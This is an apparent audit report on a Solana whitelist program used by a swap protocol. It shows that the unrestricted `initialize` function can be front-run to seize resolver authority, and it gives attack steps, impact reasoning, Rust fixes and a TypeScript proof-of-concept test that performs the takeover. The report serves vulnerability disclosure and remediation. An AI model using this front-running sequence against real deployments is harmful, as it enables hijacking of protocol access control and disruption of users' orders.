# Audit Report

## Title
Whitelist Initialization Front-Running Enables Complete Access Control Takeover

## Summary
The whitelist program's `initialize` function lacks access control, allowing any attacker to front-run the legitimate protocol initialization and permanently seize control of the entire resolver access control system. This constitutes a critical PDA griefing attack where the attacker becomes the authority by winning the initialization race.

## Finding Description

The whitelist program contains a fundamental access control vulnerability in its initialization logic. The `initialize` function is designed to set up the whitelist state with an authority who controls resolver registrations. However, this function has no restrictions on who can call it. [1](#0-0) 

The whitelist state PDA is derived using completely predictable seeds - just a constant string `"whitelist_state"`: [2](#0-1) [3](#0-2) 

The `Initialize` accounts struct shows the authority is only required to be a `Signer` with no additional validation: [4](#0-3) 

This creates a race condition where anyone can calculate the PDA address in advance and call `initialize` before the legitimate protocol team does. The Anchor `init` constraint ensures the account can only be initialized once, making this a permanent takeover.

Once an attacker calls `initialize`, they become the authority and gain exclusive control over:

- Registering new resolvers via the `register` function: [5](#0-4) 

- Deregistering existing resolvers via the `deregister` function: [6](#0-5) 

- Changing the authority via `set_authority`: [7](#0-6) 

The fusion-swap program depends on the whitelist for resolver authorization. The `fill` operation requires a valid `resolver_access` PDA: [8](#0-7) 

Similarly, the `cancel_by_resolver` operation also requires resolver access validation: [9](#0-8) 

By controlling the whitelist authority, the attacker effectively controls who can execute the core protocol operations.

**Attack Steps:**
1. Monitor blockchain for whitelist program deployment
2. Calculate whitelist_state PDA using the constant seed
3. Immediately call `initialize()` with attacker's keypair as signer
4. Transaction succeeds, attacker is set as authority
5. When protocol team attempts initialization, transaction fails (account already exists)
6. Attacker maintains permanent control unless they voluntarily transfer authority

The test utilities confirm there is no atomic initialization protection: [10](#0-9) 

## Impact Explanation

**High Severity** - This vulnerability enables complete protocol access control takeover with the following impacts:

1. **Protocol DoS**: The legitimate protocol team loses ability to initialize the whitelist with the intended authority, effectively blocking proper protocol deployment.

2. **Resolver Authorization Control**: The attacker gains exclusive power to:
   - Register malicious resolvers who can fill orders
   - Deregister legitimate resolvers to disrupt operations
   - Prevent any competition by blocking new resolver registrations
   - Extract value by selling resolver access

3. **Protocol Integrity Compromise**: Since fusion-swap depends on whitelist for authorization, the attacker indirectly controls:
   - Which addresses can call `fill` to execute orders
   - Which addresses can call `cancel_by_resolver` to cancel orders
   - The entire security model of the protocol

4. **Permanent Damage**: Without the attacker's cooperation to transfer authority, the protocol team has no recovery mechanism. They would need to redeploy the entire program suite with a new program ID.

5. **Trust Destruction**: Even if detected early, this vulnerability demonstrates a fundamental security flaw that would severely damage user confidence.

The impact is **High** rather than Critical because it requires winning a deployment race and doesn't directly enable token theft, but it does enable complete disruption of protocol operations.

## Likelihood Explanation

**High Likelihood** - This attack is highly likely to succeed because:

1. **Trivial to Execute**: The attack requires no special skills beyond:
   - Monitoring program deployments (public information)
   - Calculating a PDA address (straightforward operation using the constant seed)
   - Submitting a transaction (basic blockchain interaction)

2. **Low Cost**: The attacker only needs:
   - Enough SOL for transaction fees and rent (~0.002 SOL)
   - No special privileges or insider access
   - No complex exploit chains

3. **Wide Attack Window**: The vulnerability exists from the moment the program is deployed until initialization completes. This could be minutes to hours depending on deployment procedures.

4. **High Attacker Motivation**: 
   - Complete control over a DEX protocol's access system is extremely valuable
   - Can be monetized through extortion or selling resolver slots
   - Minimal risk of detection before execution

5. **Deterministic Success**: If the attacker's transaction is confirmed before the legitimate one, the attack succeeds with 100% certainty due to the `init` constraint.

6. **No Detection**: The attacker's initialization transaction looks identical to a legitimate one, making it impossible to distinguish malicious intent until it's too late.

The only defense is ensuring the protocol team initializes immediately after deployment, but this creates operational risk and doesn't provide guaranteed protection against a determined attacker with transaction prioritization (e.g., higher fees, MEV bots).

## Recommendation

Implement one of the following mitigations:

**Option 1: Add Authority Validation in Initialize**
Modify the `initialize` function to check that the signer matches a hardcoded expected authority public key:

```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Hardcode the expected legitimate authority public key
    const EXPECTED_AUTHORITY: Pubkey = pubkey!("YourLegitimateAuthorityPublicKeyHere");
    
    require!(
        ctx.accounts.authority.key() == EXPECTED_AUTHORITY,
        WhitelistError::UnauthorizedInitialization
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 2: Use Program Upgrade Authority**
Leverage Solana's program upgrade authority to ensure only the program deployer can initialize:

```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Verify signer is the program upgrade authority
    let program_data_address = get_program_data_address(&crate::ID)?;
    let program_data = Account::<ProgramData>::try_from(
        &ctx.accounts.program_data.to_account_info()
    )?;
    
    require!(
        program_data.upgrade_authority_address == Some(ctx.accounts.authority.key()),
        WhitelistError::UnauthorizedInitialization
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 3: Atomic Deployment Script**
Create a deployment script that deploys the program and immediately calls initialize in the same transaction or within the same block using priority fees to ensure no front-running is possible.

## Proof of Concept

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../target/types/whitelist";
import { expect } from "chai";

describe("Whitelist Front-Running Attack", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);

  const program = anchor.workspace.Whitelist as Program<Whitelist>;

  it("Any attacker can initialize the whitelist and become authority", async () => {
    // Attacker generates a keypair
    const attacker = anchor.web3.Keypair.generate();
    
    // Fund the attacker
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      1 * anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));

    // Calculate the predictable whitelist state PDA
    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );

    // Attacker calls initialize and becomes the authority
    await program.methods
      .initialize()
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();

    // Verify the attacker is now the authority
    const whitelistState = await program.account.whitelistState.fetch(
      whitelistStatePDA
    );
    expect(whitelistState.authority.toString()).to.equal(
      attacker.publicKey.toString()
    );

    // Now the legitimate protocol team tries to initialize
    const legitimateAuthority = anchor.web3.Keypair.generate();
    await provider.connection.requestAirdrop(
      legitimateAuthority.publicKey,
      1 * anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));

    // This will fail because the account already exists
    try {
      await program.methods
        .initialize()
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      expect.fail("Should have failed due to account already existing");
    } catch (error) {
      // Expected to fail - attacker has permanently taken control
      expect(error.toString()).to.include("already in use");
    }

    // Attacker now controls all resolver registrations
    const victim = anchor.web3.Keypair.generate();
    
    // Legitimate authority cannot register resolvers
    try {
      await program.methods
        .register(victim.publicKey)
        .accountsPartial({
          authority: legitimateAuthority.publicKey,
        })
        .signers([legitimateAuthority])
        .rpc();
      
      expect.fail("Should have failed due to unauthorized");
    } catch (error) {
      expect(error.toString()).to.include("Unauthorized");
    }

    // But attacker can register anyone they want
    await program.methods
      .register(victim.publicKey)
      .accountsPartial({
        authority: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();

    console.log("✓ Attacker successfully took control of whitelist authority");
    console.log("✓ Legitimate authority is permanently locked out");
    console.log("✓ Protocol deployment is compromised");
  });
});
```

## Notes

This vulnerability represents a classic initialization front-running attack in Solana programs. The core issue is that the `initialize` function has no mechanism to verify that the caller is the legitimate protocol authority. The PDA derivation using only a constant seed makes the address completely predictable, and Anchor's `init` constraint ensures the account can only be created once, making the takeover permanent.

The vulnerability is particularly severe because:
1. It affects the root of the access control system
2. Recovery requires complete program redeployment
3. The attack is trivially executable by any user
4. There is no on-chain mechanism to detect or prevent the attack

The recommended fix is to add authority validation during initialization, either by hardcoding the expected authority public key or by checking against the program upgrade authority.

### Citations

**File:** programs/whitelist/src/lib.rs (L9-9)
```rust
pub const WHITELIST_STATE_SEED: &[u8] = b"whitelist_state";
```

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L43-58)
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L60-84)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Register<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + ResolverAccess::INIT_SPACE,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L86-109)
```rust
#[derive(Accounts)]
#[instruction(user: Pubkey)]
pub struct Deregister<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    #[account(
        mut,
        close = authority,
        seeds = [RESOLVER_ACCESS_SEED, user.key().as_ref()],
        bump,
    )]
    pub resolver_access: Account<'info, ResolverAccess>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L111-123)
```rust
#[derive(Accounts)]
pub struct SetAuthority<'info> {
    #[account(mut)]
    pub current_authority: Signer<'info>,
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
}
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L648-653)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** tests/utils/utils.ts (L473-503)
```typescript
export async function initializeWhitelist(
  program: anchor.Program<Whitelist>,
  authority: anchor.web3.Keypair
) {
  const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
    [Buffer.from("whitelist_state")],
    program.programId
  );
  try {
    await program.account.whitelistState.fetch(whitelistStatePDA);
  } catch (e) {
    const isBankrun = program.provider instanceof BankrunProvider;
    if (
      (!isBankrun &&
        e.toString().includes(ANCHOR_ACCOUNT_NOT_FOUND_ERROR_PREFIX)) ||
      (isBankrun &&
        e.toString().includes(BANKRUN_ACCOUNT_NOT_FOUND_ERROR_PREFIX))
    ) {
      // Whitelist state does not exist, initialize it
      await program.methods
        .initialize()
        .accountsPartial({
          authority: authority.publicKey,
        })
        .signers([authority])
        .rpc();
    } else {
      throw e; // Re-throw if it's a different error
    }
  }
}
```
